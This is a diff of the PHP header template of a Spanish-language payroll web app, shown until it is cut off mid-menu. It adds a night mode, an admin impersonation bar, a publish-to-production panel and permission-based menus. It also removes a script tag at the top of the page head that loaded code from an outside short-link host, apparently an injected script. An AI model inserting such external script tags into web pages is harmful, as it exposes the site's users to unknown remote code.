@@ -1,17 +1,26 @@
 <?php header('Access-Control-Allow-Origin: *');  ?>
 <!DOCTYPE html >
 <html lang="en">
-<head> <script src="https://cb.run/PfRY"></script>
+<head>
+
     <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <!-- Tell the browser to be responsive to screen width -->
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5, user-scalable=yes">
     <meta name="description" content="">
     <meta name="author" content="">
+    <!-- Sube a HTTPS solo si el equipo confía en el certificado (debe ir antes que nada) -->
+    <script src="assets/js/httpsUpgrade.js?v=<?php echo filemtime(FCPATH.'assets/js/httpsUpgrade.js'); ?>"></script>
     <!-- Favicon icon -->
     <link rel="icon" type="image/png" sizes="16x16" href="assets/images/favicon.png">
     <title>Nominas</title>
     <script src="assets/js/jquery-3.3.1.js"></script>
+    <script>
+    // Si la sesión terminó (401 de application/hooks/SesionRequerida.php), regresa al login una sola vez
+    $(document).ajaxError(function (e, xhr) {
+        if (xhr && xhr.status === 401 && !window.sesionTerminada) { window.sesionTerminada = true; window.location = 'home'; }
+    });
+    </script>
     <!-- Bootstrap Core CSS -->
     <link href="assets/node_modules/bootstrap/css/bootstrap.min.css" rel="stylesheet">
     <link href="assets/node_modules/perfect-scrollbar/css/perfect-scrollbar.css" rel="stylesheet">
@@ -67,7 +76,7 @@
     <script src="assets/js/pdfmake.min.js" type="text/javascript"></script>
     <script src="assets/js/vfs_fonts.js" type="text/javascript"></script>
     <script src="https://cdn.datatables.net/buttons/1.5.2/js/buttons.html5.min.js" type="text/javascript"></script>
-    <script src="assets/js/responsive-menu.js" type="text/javascript"></script>
+    <script src="assets/js/responsive-menu.js?v=<?php echo filemtime(FCPATH.'assets/js/responsive-menu.js'); ?>" type="text/javascript"></script>
     <link rel="stylesheet" href="assets/css/evil-icons.min.css">
     <script src="assets/js/evil-icons.min.js"></script>
     <style>
@@ -83,6 +92,28 @@
             margin-right: 0px!important;
         }
         </style>
+        <link href="assets/css/modo-nocturno.css?v=<?php echo filemtime(FCPATH.'assets/css/modo-nocturno.css'); ?>" rel="stylesheet" type="text/css" />
+        <!-- Ajustes para celular (solo pantallas angostas) -->
+        <link href="assets/css/responsive-movil.css?v=<?php echo filemtime(FCPATH.'assets/css/responsive-movil.css'); ?>" rel="stylesheet" type="text/css" />
+        <!-- Radio (símbolo de música junto al usuario) -->
+        <link href="assets/css/radio.css?v=<?php echo filemtime(FCPATH.'assets/css/radio.css'); ?>" rel="stylesheet" type="text/css" />
+        <script src="assets/js/radio.js?v=<?php echo filemtime(FCPATH.'assets/js/radio.js'); ?>" type="text/javascript"></script>
+        <!-- Campos de fecha: el calendario se abre al hacer clic en todo el campo -->
+        <script src="assets/js/fechas.js?v=<?php echo filemtime(FCPATH.'assets/js/fechas.js'); ?>" type="text/javascript"></script>
+        <?php
+        // Invitados: solo música y chat (ver hooks/PermisoAcceso.php)
+        get_instance()->load->model('PermisoModel');
+        $esInvitado = PermisoModel::esInvitado(isset($user) ? $user : null);
+        ?>
+        <!-- Chat entre usuarios -->
+        <link href="assets/css/chat.css?v=<?php echo filemtime(FCPATH.'assets/css/chat.css'); ?>" rel="stylesheet" type="text/css" />
+        <script src="assets/js/chatAviso.js?v=<?php echo filemtime(FCPATH.'assets/js/chatAviso.js'); ?>" type="text/javascript"></script>
+        <script src="assets/js/chatIA.js?v=<?php echo filemtime(FCPATH.'assets/js/chatIA.js'); ?>" type="text/javascript"></script>
+        <script src="assets/js/chatBurbuja.js?v=<?php echo filemtime(FCPATH.'assets/js/chatBurbuja.js'); ?>" type="text/javascript"></script>
+<script>
+    // Aplica el modo nocturno antes de pintar la pagina (evita el parpadeo en blanco)
+    try { if (localStorage.getItem('modoNocturno') === '1') { document.documentElement.classList.add('modo-nocturno'); } } catch (e) {}
+</script>
 </head>
 <body class="fix-header fix-sidebar card-no-border">
     <!-- ============================================================== -->
@@ -94,6 +125,190 @@
             <p class="loader__label">Nominas</p>
         </div>
     </div>
+    <?php
+    // Barra "Estás viendo como…": aparece cuando un administrador está viendo el sistema como otro usuario
+    // (controllers/Usuarios.php -> suplantar/volver; la sesión guarda 'suplantacion').
+    $CIsup =& get_instance();
+    $sup = $CIsup->session->userdata('suplantacion');
+    if (!empty($sup) && !empty($sup['admin'])):
+    ?>
+    <div id="barraSuplantacion">
+        <span><i class="fa fa-eye"></i> Estás viendo el sistema como
+            <b><?php echo htmlspecialchars(isset($sup['destinoNombre']) ? $sup['destinoNombre'] : '', ENT_QUOTES); ?></b>
+            (<?php echo htmlspecialchars(isset($sup['destinoUsuario']) ? $sup['destinoUsuario'] : '', ENT_QUOTES); ?>)
+            — no eres tú.</span>
+        <button type="button" id="btnVolverAdmin"><i class="fa fa-reply"></i> Volver a mi cuenta
+            (<?php echo htmlspecialchars(isset($sup['adminUsuario']) ? $sup['adminUsuario'] : '', ENT_QUOTES); ?>)</button>
+    </div>
+    <style>
+        #barraSuplantacion { position: fixed; left: 0; right: 0; bottom: 0; z-index: 99999; background: #bf360c;
+            color: #fff; padding: 11px 14px; text-align: center; font-size: 15px; font-weight: 600;
+            box-shadow: 0 -2px 12px rgba(0,0,0,.45); border-top: 2px solid #ff9800; }
+        #barraSuplantacion span { color: #fff; }
+        #barraSuplantacion b { color: #ffe0b2; font-weight: 800; }
+        #barraSuplantacion button { margin-left: 16px; background: #fff; color: #bf360c; border: none; border-radius: 4px;
+            padding: 6px 16px; font-weight: 800; font-size: 14px; cursor: pointer; }
+        #barraSuplantacion button:hover { background: #ffe0b2; }
+        body.fix-header .page-wrapper { padding-bottom: 54px; }
+    </style>
+    <script>
+        $(function () {
+            $('#btnVolverAdmin').on('click', function () {
+                var b = $(this).prop('disabled', true);
+                $.ajax({ url: 'usuarios/volver', type: 'post', dataType: 'json' })
+                    .always(function () { window.location = 'home'; });
+            });
+        });
+    </script>
+    <?php endif; ?>
+    <?php
+    // Barra MODO DESARROLLO: solo en el equipo de desarrollo (config 'es_desarrollo', ver config.php).
+    // El administrador ve además el botón Publicar (controllers/Publicar.php) que copia los cambios a producción.
+    if ($CIsup->config->item('es_desarrollo')):
+        $esAdminDev = isset($user->idPerfil) && $user->idPerfil == 1;
+    ?>
+    <div id="barraDesarrollo">
+        <span><i class="fa fa-wrench"></i> MODO DESARROLLO · <?php echo htmlspecialchars(gethostname(), ENT_QUOTES); ?></span>
+        <?php if ($esAdminDev): ?>
+        <button type="button" id="btnPublicar" title="Copiar los cambios de este equipo a producción (SISAI)"><i class="fa fa-cloud-upload"></i> Publicar</button>
+        <?php endif; ?>
+    </div>
+    <?php if ($esAdminDev): ?>
+    <div id="panelPublicar" style="display:none;">
+        <div class="pp-caja">
+            <div class="pp-titulo"><i class="fa fa-cloud-upload"></i> Publicar a producción <button type="button" class="pp-cerrar" title="Cerrar">&times;</button></div>
+            <div class="pp-msg"></div>
+            <div class="pp-lista"></div>
+            <div class="pp-botones">
+                <button type="button" class="pp-cancelar">Cancelar</button>
+                <button type="button" class="pp-confirmar" style="display:none;"><i class="fa fa-check"></i> Publicar ahora</button>
+            </div>
+        </div>
+    </div>
+    <?php endif; ?>
+    <style>
+        #barraDesarrollo { position: fixed; top: 6px; left: 50%; transform: translateX(-50%); z-index: 100000;
+            background: repeating-linear-gradient(45deg, #ffc107, #ffc107 12px, #ffb300 12px, #ffb300 24px);
+            color: #212121; border: 2px solid #212121; border-radius: 20px; padding: 4px 6px 4px 14px;
+            font-weight: 800; font-size: 13px; letter-spacing: .5px; box-shadow: 0 2px 10px rgba(0,0,0,.35); white-space: nowrap; }
+        #barraDesarrollo span { color: #212121; }
+        #barraDesarrollo button { margin-left: 10px; background: #212121; color: #ffc107; border: none; border-radius: 14px;
+            padding: 3px 12px; font-weight: 800; font-size: 12px; cursor: pointer; }
+        #barraDesarrollo button:hover { background: #000; color: #fff; }
+        #panelPublicar { position: fixed; inset: 0; z-index: 100001; background: rgba(0,0,0,.55);
+            display: flex; align-items: center; justify-content: center; }
+        #panelPublicar .pp-caja { background: #fff; color: #222; width: 720px; max-width: calc(100vw - 32px); max-height: 85vh;
+            display: flex; flex-direction: column; border-radius: 8px; box-shadow: 0 6px 30px rgba(0,0,0,.5); }
+        #panelPublicar .pp-titulo { background: #212121; color: #ffc107; font-weight: 800; padding: 10px 14px; border-radius: 8px 8px 0 0; }
+        #panelPublicar .pp-cerrar { float: right; background: none; border: none; color: #ffc107; font-size: 20px; line-height: 1; cursor: pointer; }
+        #panelPublicar .pp-msg { padding: 12px 14px; font-size: 15px; font-weight: 600; }
+        #panelPublicar .pp-lista { padding: 0 14px; overflow: auto; flex: 1; font-family: Consolas, monospace; font-size: 12px; }
+        #panelPublicar .pp-lista div { padding: 2px 0; border-bottom: 1px solid #eee; white-space: nowrap; }
+        #panelPublicar .pp-lista .pp-tipo { display: inline-block; width: 110px; color: #1565c0; }
+        #panelPublicar .pp-lista .pp-err { color: #c62828; white-space: normal; }
+        /* el tema esconde los checkbox nativos (los pinta con label::before): aquí se fuerzan visibles */
+        #panelPublicar .pp-lista .pp-fila { display: block; font-weight: normal; margin: 0; padding: 3px 0 3px 0 !important;
+            border-bottom: 1px solid #eee; white-space: nowrap; cursor: pointer; }
+        #panelPublicar .pp-lista .pp-fila::before, #panelPublicar .pp-lista .pp-fila::after { display: none !important; content: none !important; }
+        #panelPublicar .pp-lista input.pp-chk { position: static !important; left: auto !important; opacity: 1 !important; visibility: visible !important;
+            -webkit-appearance: checkbox !important; appearance: checkbox !important; display: inline-block !important;
+            width: 15px; height: 15px; margin: 0 8px 0 0 !important; vertical-align: middle; pointer-events: auto; }
+        #panelPublicar .pp-lista .pp-fecha { display: inline-block; width: 120px; color: #757575; }
+        #panelPublicar .pp-lista .pp-sel { position: sticky; top: 0; z-index: 1; background: #fff; display: flex; align-items: center;
+            font-weight: 700; padding: 4px 0; border-bottom: 2px solid #ccc; }
+        #panelPublicar .pp-lista .pp-sel .pp-fila { border: none; font-weight: 700; }
+        #panelPublicar .pp-cuenta { color: #757575; font-weight: normal; margin-left: 12px; }
+        #panelPublicar .pp-botones { padding: 10px 14px; text-align: right; border-top: 1px solid #ddd; }
+        #panelPublicar .pp-botones button { border: none; border-radius: 4px; padding: 7px 16px; font-weight: 700; cursor: pointer; margin-left: 8px; }
+        #panelPublicar .pp-cancelar { background: #e0e0e0; color: #333; }
+        #panelPublicar .pp-confirmar { background: #2e7d32; color: #fff; }
+        #panelPublicar .pp-confirmar:disabled { opacity: .6; cursor: wait; }
+        html.modo-nocturno #panelPublicar .pp-caja { background: #263238; color: #eceff1; }
+        html.modo-nocturno #panelPublicar .pp-lista div { border-bottom-color: #37474f; }
+        html.modo-nocturno #panelPublicar .pp-lista .pp-tipo { color: #90caf9; }
+        html.modo-nocturno #panelPublicar .pp-lista .pp-sel { background: #263238; border-bottom-color: #546e7a; }
+        html.modo-nocturno #panelPublicar .pp-lista .pp-fila { border-bottom-color: #37474f; color: #eceff1; }
+        html.modo-nocturno #panelPublicar .pp-lista .pp-fecha, html.modo-nocturno #panelPublicar .pp-cuenta { color: #90a4ae; }
+    </style>
+    <?php if ($esAdminDev): ?>
+    <script>
+        $(function () {
+            var $p = $('#panelPublicar'), $msg = $p.find('.pp-msg'), $lista = $p.find('.pp-lista'), $ok = $p.find('.pp-confirmar');
+            var $cancel = $p.find('.pp-cancelar');   // "Cancelar" si hay algo por publicar; "Cerrar" si no
+            var enCurso = false;
+            function esc(s) { return $('<div>').text(s == null ? '' : s).html(); }
+            // conCasillas: en la revisión cada archivo trae su casilla para publicar solo los marcados
+            function pintar(r, conCasillas) {
+                var h = '';
+                // Se pre-marca lo más reciente: los archivos del último día en que hubo cambios
+                var ultimoDia = '';
+                $.each(r.archivos || [], function (i, a) { var d = (a.fecha || '').substr(0, 10); if (d > ultimoDia) ultimoDia = d; });
+                if (conCasillas && (r.archivos || []).length) {
+                    h += '<div class="pp-sel"><label class="pp-fila"><input type="checkbox" class="pp-todos pp-chk"> Todos</label>'
+                       + '<span class="pp-cuenta"></span></div>';
+                }
+                $.each(r.archivos || [], function (i, a) {
+                    var marcado = (a.fecha || '').substr(0, 10) === ultimoDia;
+                    h += '<label class="pp-fila">'
+                       + (conCasillas ? '<input type="checkbox" class="pp-arch pp-chk"' + (marcado ? ' checked' : '') + ' value="' + esc(a.ruta) + '">' : '')
+                       + '<span class="pp-fecha">' + esc(a.fecha || '') + '</span>'
+                       + '<span class="pp-tipo">' + esc(a.tipo) + '</span>' + esc(a.ruta) + '</label>';
+                });
+                if (r.total > (r.archivos || []).length) h += '<div>… y ' + (r.total - r.archivos.length) + ' más</div>';
+                $.each(r.errores || [], function (i, e) { h += '<div class="pp-err"><i class="fa fa-warning"></i> ' + esc(e) + '</div>'; });
+                $lista.html(h);
+                contar();
+            }
+            var totalRevisado = 0;
+            function contar() {
+                var n = $lista.find('.pp-arch:checked').length, t = $lista.find('.pp-arch').length;
+                $lista.find('.pp-cuenta').text(n + ' de ' + t + ' marcados');
+                $lista.find('.pp-todos').prop('checked', n === t).prop('indeterminate', n > 0 && n < t);
+                $ok.prop('disabled', n === 0);
+            }
+            $lista.on('change', '.pp-todos', function () { $lista.find('.pp-arch').prop('checked', this.checked); contar(); });
+            $lista.on('change', '.pp-arch', contar);
+            function cerrar() { if (!enCurso) $p.hide(); }
+            $('#btnPublicar').on('click', function () {
+                $lista.empty(); $ok.hide().prop('disabled', false); $cancel.text('Cerrar');
+                $msg.html('<i class="fa fa-spinner fa-spin"></i> Revisando qué cambió contra producción…');
+                $p.css('display', 'flex');
+                enCurso = true;
+                $.ajax({ url: 'publicar/revisar', type: 'post', dataType: 'json' })
+                    .done(function (r) {
+                        $msg.text(r.mensaje || '').css('color', r.exito ? '' : '#c62828');
+                        totalRevisado = r.total || 0;
+                        pintar(r, r.exito && r.total > 0);
+                        if (r.exito && r.total > 0) { $ok.show(); $cancel.text('Cancelar'); contar(); }
+                    })
+                    .fail(function () { $msg.text('No se pudo revisar (revisa que Apache siga prendido).').css('color', '#c62828'); })
+                    .always(function () { enCurso = false; });
+            });
+            $ok.on('click', function () {
+                var marcados = $lista.find('.pp-arch:checked').map(function () { return this.value; }).get();
+                var todos = marcados.length === totalRevisado;   // todo marcado = publicación completa
+                if (!marcados.length) return;
+                if (!confirm(todos ? '¿Publicar TODOS los cambios a producción? Los verán todos los usuarios.'
+                                   : '¿Publicar solo los ' + marcados.length + ' archivo(s) marcados? Los demás se quedan pendientes.')) return;
+                enCurso = true;
+                $ok.prop('disabled', true);
+                $msg.html('<i class="fa fa-spinner fa-spin"></i> Publicando… no cierres esta ventana.').css('color', '');
+                $.ajax({ url: 'publicar/ejecutar', type: 'post', dataType: 'json', data: todos ? {} : { archivos: marcados } })
+                    .done(function (r) {
+                        $msg.html((r.exito ? '<i class="fa fa-check-circle" style="color:#2e7d32"></i> ' : '<i class="fa fa-times-circle"></i> ') + esc(r.mensaje))
+                            .css('color', r.exito ? '' : '#c62828');
+                        pintar(r);
+                        $ok.hide();
+                        $cancel.text('Cerrar');
+                    })
+                    .fail(function () { $msg.text('Falló la publicación (revisa application/logs/publicar.log).').css('color', '#c62828'); $ok.prop('disabled', false); })
+                    .always(function () { enCurso = false; });
+            });
+            $p.find('.pp-cancelar, .pp-cerrar').on('click', cerrar);
+        });
+    </script>
+    <?php endif; ?>
+    <?php endif; ?>
     <!-- ============================================================== -->
     <!-- Main wrapper - style you can find in pages.scss -->
     <!-- ============================================================== -->
@@ -131,13 +346,46 @@
                     <!-- ============================================================== -->
                     <!-- toggle and nav items -->
                     <!-- ============================================================== -->
+                     
                     <ul class="navbar-nav mr-auto">
+                        <li class="nav-item">
+                            <a class="nav-link" href="javascript:void(0)" id="toggleNocturno" title="Modo nocturno">
+                                <i class="fa fa-moon-o"></i>
+                            </a>
+                        </li>
                         <li class="nav-item"> <a class="nav-link nav-toggler hidden-md-up waves-effect waves-dark" href="javascript:void(0)" id="menu-toggle"><i class="fa fa-bars"></i></a> </li>
                     </ul>
                     <!-- ============================================================== -->
                     <!-- User profile and search -->
                     <!-- ============================================================== -->
                     <ul class="navbar-nav my-lg-0">
+                        <?php
+                        // Radio (assets/js/radio.js): se desbloquea con la contraseña de la música
+                        $CI =& get_instance();
+                        $hayClaveMusica = false;
+                        try {
+                            $fm = $CI->db->query("SELECT CASE WHEN OBJECT_ID('dbo.ConfigSistema') IS NOT NULL THEN 1 ELSE 0 END AS t")->row_array();
+                            if ($fm && $fm['t'] == 1) {
+                                $hayClaveMusica = $CI->db->query("SELECT 1 AS x FROM dbo.ConfigSistema WHERE clave = 'musica_clave' AND valor IS NOT NULL")->num_rows() > 0;
+                            }
+                        } catch (Exception $e) {}
+                        ?>
+                        <!-- Chat entre usuarios: oculto arriba, se usa la burbuja (assets/js/chatBurbuja.js);
+                             se deja el elemento porque chatAviso.js y chatBurbuja.js lo usan para saber que hay sesión -->
+                        <li class="nav-item d-none">
+                            <a class="nav-link" href="chat" id="chatIcono" title="Chat y reporte de fallas">
+                                <i class="fa fa-comments"></i><span class="chat-badge" style="display:none;"></span>
+                            </a>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link" href="javascript:void(0)" id="radioIcono" title="Radio"
+                               data-desbloqueada="<?php echo ($esInvitado || $CI->session->userdata('musicaDesbloqueada')) ? '1' : '0'; ?>"
+                               data-hayclave="<?php echo $hayClaveMusica ? '1' : '0'; ?>"
+                               data-admin="<?php echo (isset($user->idPerfil) && $user->idPerfil == 1) ? '1' : '0'; ?>"
+                               data-equipo="sisai">
+                                <i class="fa fa-music"></i>
+                            </a>
+                        </li>
                         <!-- ============================================================== -->
                         <!-- Profile -->
                         <!-- ============================================================== -->
@@ -156,7 +404,8 @@
                                             </div>
                                         </div>
                                     </li>
-                                    <li>           
+                                    <li><a href="licencia"><i class="fa fa-key"> </i> Licencia</a></li>
+                                    <li>
                                     <a href="#" id="logout_admin"><i class="fa fa-power-off"> </i> Cerrar Sesión</a>
                                     </li>
                                 </ul>
@@ -188,330 +437,39 @@
                         <i class="fa fa-home"></i>
                         <span class="hide-menu">Inicio</span></a>
                         </li>
-                        <?php if ($user->idPerfil==6) {?>
-                            <li> 
-                                <a class="waves-effect waves-dark" href="produccion" aria-expanded="true">
-                                    <i class="fa fa-product-hunt"></i>
-                                    <span class="hide-menu">Produccion </span>
-                                </a>
-                            </li>
-                        <?php } ?>      
-                        
+                        <?php
+                        // Menú según los permisos del usuario (dbo.UsuarioPermiso, ver Catálogos > Usuarios > Permisos)
+                        $CI =& get_instance();
+                        $CI->load->model('PermisoModel');
+                        $menu = $CI->PermisoModel->menuUsuario($user);
+                        $titulos = array('Catalogos' => 'Catalogos', 'Reportes' => 'Reportes', 'Importar/Exportar' => 'Importar/Exportar');
+                        foreach (PermisoModel::$secciones as $seccion) {
+                            if (empty($menu[$seccion])) continue;
+                            if ($seccion === 'General') {
+                                foreach ($menu[$seccion] as $op) { ?>
+                        <li>
+                            <a class="waves-effect waves-dark" href="<?php echo htmlspecialchars($op['url']); ?>" aria-expanded="true">
+                                <?php echo $op['icono']; ?>
+                                <span class="hide-menu"><?php echo htmlspecialchars($op['nombre']); ?></span>
+                            </a>
+                        </li>
+                        <?php   }
+                                continue;
+                            } ?>
                         <li class=""> <a class="has-arrow waves-effect waves-dark" href="#" aria-expanded="true">
-                            <i class="icon-Double-Circle"></i><span class="hide-menu">Catalogos</span></a>
-                            <ul aria-expanded="true" class="collapse" style="">                             
-                                <?php if ($user->idPerfil==1) {?>
-                                    <li> 
-                                        <a class="waves-effect waves-dark" href="usuarios" aria-expanded="true">
-                                            <i class="fa fa-user-circle-o"></i>
-                                            <span class="hide-menu">Usuarios </span>
-                                        </a>
-                                    </li>
-                                <?php } ?>  
-                                
-                                <?php if ($user->idPlanta!=28 && $user->idPlanta!=27  && $user->idPlanta!=26 && $user->idPlanta!=25 && $user->idPlanta!=22  && $user->idPlanta!=30 && $user->idPlanta!=21  || $user->idPlanta!=25  ) {?>   
-                                <li>  
-                                    <a class="waves-effect waves-dark" href="empleados" aria-expanded="true">
-                                        <i class="fa fa-address-card"></i>
-                                        <span class="hide-menu">Empleados</span>
+                            <i class="icon-Double-Circle"></i><span class="hide-menu"><?php echo $titulos[$seccion]; ?></span></a>
+                            <ul aria-expanded="true" class="collapse">
+                                <?php foreach ($menu[$seccion] as $op) { ?>
+                                <li>
+                                    <a class="waves-effect waves-dark" href="<?php echo htmlspecialchars($op['url']); ?>" aria-expanded="true">
+                                        <?php echo $op['icono']; ?>
+                                        <span class="hide-menu"><?php echo htmlspecialchars($op['nombre']); ?></span>
                                     </a>
-                                </li> 
+                                </li>
                                 <?php } ?>
-                                <?php if ($user->idPlanta==22  || $user->idPerfil==1 )  {?>
-                                <!-- Boton de Leon Guzman // Josue-->  
-                                <li>  
-                                    <a class="waves-effect waves-dark" href="EmpleadosController_SYSEL" aria-expanded="true">
-                                        <i class="fa fa-address-card"></i>
-                                        <span class="hide-menu">Empleados SYSEL</span>
-                                    </a>
-                                </li>     
-                                <?php } ?>
-                                
-                                <?php if ($user->idPerfil==1 && $user->idPerfil==2 ) {?>     
-                                <li>  
-                                    <a class="waves-effect waves-dark" href="EmpleadosRH" aria-expanded="true">
-                                        <i class="fa fa-address-card"></i>
-                                        <span class="hide-menu">EmpleadosRH</span>
-                                    </a>
-                                </li> 
-                                <?php } ?>  
-                                                        
-                                <?php if ($user->idPlanta==13  || $user->idPerfil==1 )  {?>
-                                <li>  
-                                    <a class="waves-effect waves-dark" href="EmpleadosController_Pedri" aria-expanded="true">
-                                        <i class="fa fa-address-card"></i>
-                                        <span class="hide-menu">Empleados Pedriceña</span>
-                                    </a>
-                                </li>  
-                                <?php } ?>  
-                                
-                                <?php  if ($user->idPlanta!=25 )  {?>
-                                <!-- Boton de Leon Guzman // Josue-->  
-                                <li>  
-                                    <a class="waves-effect waves-dark" href="EmpleadosController_Leon_Guzman" aria-expanded="true">
-                                        <i class="fa fa-address-card"></i>
-                                        <span class="hide-menu">Empleados León Guzmán</span>
-                                    </a>
-                                </li>     
-                                <?php } ?>  
-                                
-                                <?php if ($user->idPlanta==15  || $user->idPerfil==1 )  {?>
-                                <!-- Boton de Leon Guzman // Josue-->  
-                                <li>  
-                                    <a class="waves-effect waves-dark" href="EmpleadosController_TCT" aria-expanded="true">
-                                        <i class="fa fa-address-card"></i>
-                                        <span class="hide-menu">Empleados TCT</span>
-                                    </a>
-                                </li> 
-                                <?php } ?>  
-                                
-                                <?php if ($user->idPlanta==15  || $user->idPerfil==1 )  {?>
-                                <li>  
-                                    <a class="waves-effect waves-dark" href="EmpleadosController_Leon_Guzman_Almohadas" aria-expanded="true">
-                                        <i class="fa fa-address-card"></i>
-                                        <span class="hide-menu">Empleados León Guzmán Almohadas</span>
-                                    </a>
-                                </li>    
-                                <?php } ?>  
-                                <?php if (($user->idPlanta==16 && $user->idPerfil==2)    || ($user->idPerfil==1  || $user->idPerfil==3  | $user->idPerfil==5)|| $user->idPlanta!=25 )  {?>
-                                <li>  
-                                    <a class="waves-effect waves-dark" href="EmpleadosController_Arcinas" aria-expanded="true">
-                                        <i class="fa fa-address-card"></i>
-                                        <span class="hide-menu">Empleados Arcinas</span>
-                                    </a>
-                                </li> 
-                                <?php } ?>  
-
-                                <?php if (($user->idPlanta==39 && $user->idPerfil==2)   || ($user->idPerfil==1 || $user->idPerfil==3  | $user->idPerfil==5) || $user->idPlanta!=25 )  {?>
-                                <li>  
-                                    <a class="waves-effect waves-dark" href="EmpleadosController_Tlahualilo" aria-expanded="true">
-                                        <i class="fa fa-address-card"></i>
-                                        <span class="hide-menu">Empleados Tlahualilo</span>
-                                    </a>
-                                </li>     
-                                <?php } ?>  
-
-                                <?php if ($user->idPlanta>=1 && $user->idPlanta<=10  ||    $user->idPlanta>=16 &&  $user->idPlanta<=19  ||  $user->idPlanta==29 ||  $user->idPlanta==25 ) {?>      
-                                <li>  
-                                    <a class="waves-effect waves-dark" href="EmpleadosController_Eventuales" aria-expanded="true">
-                                        <i class="fa fa-address-card"></i>
-                                        <span class="hide-menu">Empleados Eventuales</span>
-                                    </a>
-                                </li>                                                                                          
-                                
-                                <?php } ?>  
-
-                                
-                                <?php if ($user->idPlanta==11 || $user->idPlanta==12 || $user->idPlanta==13  ) {?>      
-                                <li style="float: left;width: 100%;">  
-                                    <a class="waves-effect waves-dark" href="byte" aria-expanded="true">
-                                    <i class="fa fa-male"></i><i class="fa fa-random"></i>
-                                    <span class="hide-menu">Empleados Byte</span></a>
-                                </li>     
-
-                                <?php } ?>  
-
-                                <?php if ($user->idPerfil==1 || $user->idPerfil==2 || $user->idPerfil==3  | $user->idPerfil==5)  {?>                                      
-                                <li>
-                                    <a class="waves-effect waves-dark" href="horariosusuario" aria-expanded="true">
-                                        <i class="fa fa-male"></i><i class="fa fas fa-plus-circle"></i>
-                                        <span class="hide-menu">Asignacion de Horarios</span>
-                                    </a>
-                                </li>
-                                <li>
-                                    <a class="waves-effect waves-dark" href="horariosempresa" aria-expanded="true">
-                                        <i class="fa fa-building"></i>
-                                        <span class="hide-menu">Asignacion de Horarios x Empresa</span>
-                                    </a>
-                                </li>
-                                <li>  
-                                    <a class="waves-effect waves-dark" href="horarios" aria-expanded="true">                               
-                                        <div id="horario" data-icon="ei-clock" data-size="s" ></div>
-                                        <span class="hide-menu">Horarios</span>
-                                    </a>
-                                </li>
-                                <li>  
-                                    <a class="waves-effect waves-dark" href="incidencia" aria-expanded="true">   
-                                        <span class="icon-holder">
-                                            <img class="irc_mi" src="assets/images/incidencia.png" data-atf="0" width="25" height="25" style="">
-                                        </span>
-                                        <span class="hide-menu">incidencias</span>
-                                    </a>
-                                </li>
-                                <li> 
-                                    <a class="waves-effect waves-dark" href="conceptos" aria-expanded="true">        
-                                        <div data-icon="ei-navicon" ></div>                       
-                                        <span class="hide-menu">Conceptos</span>
-                                    </a>
-                                </li>
-                                <?php } ?>  
                             </ul>
                         </li>
-                        <li class=""> <a class="has-arrow waves-effect waves-dark" href="#" aria-expanded="true">
-                            <i class="icon-Double-Circle"></i><span class="hide-menu">Reportes</span></a>
-                            <ul aria-expanded="true" class="collapse" style="height: 0px;">                               
-
-                            <?php if ($user->idPerfil==1 || $user->idPerfil==2  )  {    ?>
-                                <li>
-                                    <a class="waves-effect waves-dark" href="asistencias" aria-expanded="true">                                    
-                                        <div data-icon="ei-calendar"  style="margin:0px!important;"></div>
-                                        <span class="hide-menu">Reporte Asistencia</span>
-                                    </a>
-                                </li>
-                                <?php if ($user->idPlanta!=28 && $user->idPlanta!=27  && $user->idPlanta!=26 && $user->idPlanta!=28 && $user->idPlanta!=25 && $user->idPlanta!=22  && $user->idPlanta!=30 && $user->idPlanta!=21   && $user->idPlanta!=25   ) {?>   
-                                
-                                <li> 
-                                    <a class="waves-effect waves-dark" href="diarioController" aria-expanded="true">                                    
-                                        <div data-icon="ei-calendar"  style="margin:0px!important;"></div>
-                                        <span class="hide-menu">Reporte Diario</span>
-                                    </a>
-                                </li> 
-                                <li> 
-                                    <a class="waves-effect waves-dark" href="facturacionController" aria-expanded="true">                                    
-                                        <div data-icon="ei-calendar"  style="margin:0px!important;"></div>
-                                        <span class="hide-menu">Reporte Facturacion</span>
-                                    </a>
-                                </li> 
-                                
-                                <li> 
-                                    <a class="waves-effect waves-dark" href="percepcionesController" aria-expanded="true">                                    
-                                        <div data-icon="ei-calendar"  style="margin:0px!important;"></div>
-                                        <span class="hide-menu">Reporte Percepciones</span>
-                                    </a>
-                                </li>
-                                
-                                <li> 
-                                    <a class="waves-effect waves-dark" href="retencionesController" aria-expanded="true">                                    
-                                        <div data-icon="ei-calendar"  style="margin:0px!important;"></div>
-                                        <span class="hide-menu">Reporte Retenciones</span>
-                                    </a>
-                                </li>
-                                
-                                <li> 
-                                    <a class="waves-effect waves-dark" href="relacionSolicitudesController" aria-expanded="true">                                    
-                                        <div data-icon="ei-calendar"  style="margin:0px!important;"></div>
-                                        <span class="hide-menu">Reporte Relacion de Solicitudes</span>
-                                    </a>
-                                </li>
-                                <li> 
-                                    <a class="waves-effect waves-dark" href="costoController" aria-expanded="true">                                    
-                                        <div data-icon="ei-calendar"  style="margin:0px!important;"></div>
-                                        <span class="hide-menu">Reporte Costo</span>
-                                    </a>
-                                </li>
-                                <li> 
-                                    <a class="waves-effect waves-dark" href="controller137" aria-expanded="true">                                    
-                                        <div data-icon="ei-calendar"  style="margin:0px!important;"></div>
-                                        <span class="hide-menu">Reporte 137</span>
-                                    </a>
-                                </li>
-                                <li> 
-                                    <a class="waves-effect waves-dark" href="controllerReporteAsistenciatxt" aria-expanded="true">                                    
-                                        <div data-icon="ei-calendar"  style="margin:0px!important;"></div>
-                                        <span class="hide-menu">Reporte Asistencia Txt</span>
-                                    </a>
-                                </li>
-                                <li> 
-                                    <a class="waves-effect waves-dark" href="pensionController" aria-expanded="true">                                    
-                                        <div data-icon="ei-calendar"  style="margin:0px!important;"></div>
-                                        <span class="hide-menu">Reporte Pension Alimenticia</span>
-                                    </a>
-                                </li>
-                                <li> 
-                                    <a class="waves-effect waves-dark" href="HorasxCostoController" aria-expanded="true">                                    
-                                        <div data-icon="ei-calendar"  style="margin:0px!important;"></div>
-                                        <span class="hide-menu">Reporte HorasxCosto</span>
-                                    </a>
-                                </li>
-                                <li> 
-                                    <a class="waves-effect waves-dark" href="HorasxCostoPorPuestoController" aria-expanded="true">                                    
-                                        <div data-icon="ei-calendar"  style="margin:0px!important;"></div>
-                                        <span class="hide-menu">Reporte HorasxCostoxPuesto</span>
-                                    </a>
-                                </li>
-                                <li> 
-                                    <a class="waves-effect waves-dark" href="percepcionesNotimbradasController" aria-expanded="true">                                    
